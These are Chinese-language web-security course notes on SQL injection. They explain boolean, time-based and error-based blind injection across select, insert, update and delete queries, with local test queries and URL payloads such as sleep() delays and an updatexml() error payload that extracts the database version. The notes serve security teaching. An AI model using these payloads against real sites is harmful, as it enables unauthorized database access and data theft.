# WEB攻防-通用漏洞&SQL注入&增删改查&盲注&延时&布尔&报错

![day29](/Users/yangluchao/Documents/GitHub/security/image/day29.png)

```
#知识点：
1、明确查询方式注入Payload
2、明确查询方式注入产生功能
3、明确SQL盲注延时&布尔&报错

#详细点：
盲注就是在注入过程中，获取的数据不能回显至前端页面。
此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。
解决：常规的联合查询注入不行的情况
我们可以知道盲注分为以下三类：
-基于布尔的SQL盲注-逻辑判断
regexp,like,ascii,left,ord,mid
-基于时间的SQL盲注-延时判断
if,sleep
-基于报错的SQL盲注-报错回显
floor，updatexml，extractvalue
https://www.jianshu.com/p/bc35f8dd4f7c

参考：
like 'ro%'            #判断ro或ro...是否成立 
regexp '^xiaodi[a-z]' #匹配xiaodi及xiaodi...等
if(条件,5,0)           #条件成立 返回5 反之 返回0
sleep(5)              #SQL语句延时执行5秒
mid(a,b,c)            #从位置b开始，截取a字符串的c位
substr(a,b,c)         #从位置b开始，截取字符串a的c长度
left(database(),1)，database() #left(a,b)从左侧截取a的前b位
length(database())=8  #判断数据库database()名的长度
ord=ascii ascii(x)=97 #判断x的ascii码是否等于97

SQL查询方式注入
select,insert,update,delete,orderby等

基本知识本地测试
select * from member where username like 'vi%';
select * from member where username regexp '^x';
select * from member where id=1 and sleep(1);
select * from member where id=1 and if(1>2,sleep(1),0);
select * from member where id=1 and if(1<2,sleep(1),0);
select * from member where id=1 and length(database())=7;
select * from member where id=1 and left(database(),1)='p';
select * from member where id=1 and left(database(),2)='pi';
select * from member where id=1 and substr(database(),1,1)='p';
select * from member where id=1 and substr(database(),2,1)='i';
select * from member where id=1 and ord(left(database(),1))=112;

```

演示案例：

------

-   SQL-盲注&布尔&报错&延时
-   查询-select-xhcms-布尔盲注
-   插入-insert-xhcms-报错盲注
-   更新-update-xhcms-报错盲注
-   删除-delete-kkcms-延时盲注

```
#SQL-盲注&布尔&报错&延时
PHP开发项目-输出结果&开启报错
基于延时：都不需要
/blog/news.php?id=1 and if(1=1,sleep(5),0)
基于布尔：有数据库输出判断标准
/blog/news.php?id=1 and length(database())=7
基于报错：有数据库报错处理判断标准
/blog/news.php?id=2 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)

知识点：
1、查询方式增删改查四种特性决定，部分是不需要进行数据取出和显示，所以此类注入基本上需要采用盲注才能正常得到结果（黑盒测试可以根据功能判断注入查询方式）
2、查询方式增删改查四种特性决定应用功能点（会员注册，删除新闻，修改文章等）

```

